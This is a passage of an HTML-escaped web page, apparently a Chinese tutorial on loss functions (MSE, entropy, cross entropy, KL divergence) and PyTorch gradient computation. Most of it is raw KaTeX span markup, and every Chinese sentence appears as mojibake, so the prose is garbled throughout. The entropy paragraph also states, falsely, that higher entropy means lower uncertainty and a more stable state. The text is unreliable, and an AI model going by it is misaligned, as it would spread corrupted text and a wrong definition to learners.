style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.6000100000000002em;vertical-align:-0.55001em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mop op-symbol large-op&#34; style=&#34;position:relative;top:-0.000004999999999977245em;&#34;&gt;âˆ‘&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;y&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;âˆ’&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.1141079999999999em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord accent&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.56778em;&#34;&gt;&lt;span style=&#34;top:-3em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;y&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;accent-body&#34; style=&#34;left:-0.19444em;&#34;&gt;Ë‰&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.19444em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8641079999999999em;&#34;&gt;&lt;span style=&#34;top:-3.113em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Cross Entropy Loss&lt;/p&gt;
&lt;p&gt;Entropyç†µï¼Œç†µè¶Šé«˜ï¼Œä¸ç¡®å®šæ€§uncertaintyè¶Šå°ï¼Œä¹Ÿå°±æ˜¯è¶Šç¨³å®šçš„çŠ¶æ€ã€‚&lt;/p&gt;
&lt;p class=&#39;katex-block&#39;&gt;&lt;span class=&#34;katex-display&#34;&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;E&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;y&lt;/mi&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mo&gt;âˆ’&lt;/mo&gt;&lt;mo&gt;âˆ‘&lt;/mo&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;g&lt;/mi&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mspace linebreak=&#34;newline&#34;&gt;&lt;/mspace&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;Entropy = -\sum p(x)log p(x) \\
&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8777699999999999em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.05764em;&#34;&gt;E&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;y&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.6000100000000002em;vertical-align:-0.55001em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;âˆ’&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mop op-symbol large-op&#34; style=&#34;position:relative;top:-0.000004999999999977245em;&#34;&gt;âˆ‘&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;g&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace newline&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;äº¤å‰ç†µå°±æ˜¯ä¸¤ä¸ªä¸åŒçš„åˆ†å¸ƒï¼Œå®šä¹‰ä¸ºï¼š&lt;/p&gt;
&lt;p class=&#39;katex-block&#39;&gt;&lt;span class=&#34;katex-display&#34;&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;C&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mtext&gt;Â &lt;/mtext&gt;&lt;mi&gt;E&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;y&lt;/mi&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mi&gt;H&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mi&gt;q&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mo&gt;âˆ’&lt;/mo&gt;&lt;mo&gt;âˆ‘&lt;/mo&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;g&lt;/mi&gt;&lt;mi&gt;q&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mspace linebreak=&#34;newline&#34;&gt;&lt;/mspace&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mi&gt;H&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;D&lt;/mi&gt;&lt;mrow&gt;&lt;mi&gt;K&lt;/mi&gt;&lt;mi&gt;L&lt;/mi&gt;&lt;/mrow&gt;&lt;/msub&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;âˆ£&lt;/mi&gt;&lt;mi&gt;q&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;Cross \space Entropy = H(p,q) = - \sum p(x)logq(x) \\
 = H(p) + D_{KL}(p|q)
&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8777699999999999em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.07153em;&#34;&gt;C&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mspace&#34;&gt;Â &lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.05764em;&#34;&gt;E&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;y&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.08125em;&#34;&gt;H&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;q&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.6000100000000002em;vertical-align:-0.55001em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;âˆ’&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mop op-symbol large-op&#34; style=&#34;position:relative;top:-0.000004999999999977245em;&#34;&gt;âˆ‘&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;g&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;q&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace newline&#34;&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.36687em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.08125em;&#34;&gt;H&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02778em;&#34;&gt;D&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.32833099999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34; style=&#34;margin-right:0.07153em;&#34;&gt;K&lt;/span&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;L&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;âˆ£&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;q&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mi&gt;D&lt;/mi&gt;&lt;mrow&gt;&lt;mi&gt;K&lt;/mi&gt;&lt;mi&gt;L&lt;/mi&gt;&lt;/mrow&gt;&lt;/msub&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;âˆ£&lt;/mi&gt;&lt;mi&gt;q&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;D_{KL}(p|q)&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02778em;&#34;&gt;D&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.32833099999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34; style=&#34;margin-right:0.07153em;&#34;&gt;K&lt;/span&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;L&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;âˆ£&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;q&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;å®šä¹‰ä¸ºæ•£åº¦ï¼Œå½“ä¸¤ä¸ªåˆ†å¸ƒé‡åˆçš„éƒ¨åˆ†è¶Šä½ï¼Œä¹Ÿå°±æ˜¯è¶Šä¸ç›¸ä¼¼ï¼Œå…¶å€¼è¶Šé«˜ï¼Œåä¹‹è¶Šä½ã€‚&lt;/p&gt;
&lt;p&gt;åœ¨åˆ†ç±»çš„é—®é¢˜å½“ä¸­ï¼Œé€šå¸¸é‡‡ç”¨one-hotç¼–ç ï¼Œè¿™ç§ç¼–ç çš„Entropyä¸º0ï¼Œå¸¦å…¥åˆ°Cross Entropyä¸­ï¼š&lt;/p&gt;
&lt;p class=&#39;katex-block&#39;&gt;&lt;span class=&#34;katex-display&#34;&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;C&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mtext&gt;Â &lt;/mtext&gt;&lt;mi&gt;E&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;y&lt;/mi&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;D&lt;/mi&gt;&lt;mrow&gt;&lt;mi&gt;K&lt;/mi&gt;&lt;mi&gt;L&lt;/mi&gt;&lt;/mrow&gt;&lt;/msub&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;âˆ£&lt;/mi&gt;&lt;mi&gt;q&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;Cross \space Entropy = D_{KL}(p|q)
&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8777699999999999em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.07153em;&#34;&gt;C&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mspace&#34;&gt;Â &lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.05764em;&#34;&gt;E&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;y&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02778em;&#34;&gt;D&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.32833099999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34; style=&#34;margin-right:0.07153em;&#34;&gt;K&lt;/span&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;L&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;âˆ£&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;q&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;æ°å¥½æ˜¯ä¸¤ä¸ªåˆ†å¸ƒçš„æ•£åº¦ï¼Œæˆ‘ä»¬å¯ä»¥å°†å…¶ä½œä¸ºä¼˜åŒ–ç›®æ ‡ï¼Œä¹Ÿå°±æ˜¯æ¨¡å‹çš„é¢„æµ‹åˆ†å¸ƒå’ŒçœŸå®åˆ†å¸ƒä¹‹é—´çš„æ•£åº¦ï¼Œæœ€å°åŒ–è¯¥æ•£åº¦ï¼Œä¹Ÿå°±æ˜¯æœ€å°åŒ–ä¸¤ä¸ªåˆ†å¸ƒä¹‹é—´çš„å·®è·ã€‚&lt;/p&gt;
&lt;p&gt;å¯ä»¥æ±‚äºŒåˆ†ç±»å’Œå¤šåˆ†ç±»é—®é¢˜çš„æŸå¤±å€¼ï¼Œæ­é…softmaxæ¿€æ´»å‡½æ•°æ•ˆæœä¼šæ›´å¥½ã€‚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;binary&lt;/li&gt;
&lt;li&gt;multi-class&lt;/li&gt;
&lt;li&gt;softmax&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;51-lossæ¢¯åº¦&#34;&gt;5.1 Lossæ¢¯åº¦&lt;/h4&gt;
&lt;p&gt;ç”±äºæ¨¡å‹çš„ç›®æ ‡æ˜¯å°†lossé™åˆ°æœ€ä½ï¼Œå› æ­¤éœ€è¦æ‰¾åˆ°lossçš„æœ€å°å€¼ï¼Œé‚£ä¹ˆé€šè¿‡å¯¹lossæ±‚å¯¼çš„æ–¹å¼å¯»æ‰¾ã€‚&lt;/p&gt;
&lt;p&gt;Lossçš„æ¢¯åº¦æ±‚è§£æœ‰ä¸¤ç§æ–¹æ³•&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;torch.autograd.grad(loss, [w1, w2, ...])&lt;/p&gt;
&lt;p&gt;ç”¨æœ€åçš„losså¯¹å‚æ•°[w1, w1, ...]è¿›è¡Œæ±‚åå¯¼ï¼Œè¿”å›ä¸€ä¸ªå¯¼æ•°å€¼çš„åˆ—è¡¨&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;loss.backward()&lt;/p&gt;
